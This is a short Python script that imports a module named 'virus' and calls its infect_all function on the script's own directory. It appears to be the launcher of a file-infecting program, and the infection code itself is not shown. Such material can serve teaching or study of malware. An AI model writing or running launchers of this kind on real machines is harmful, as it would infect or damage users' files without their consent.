from pathlib import Path

import virus


def main():
    here = Path(__file__).parent
    virus.infect_all(here)


if __name__ == "__main__":
    main()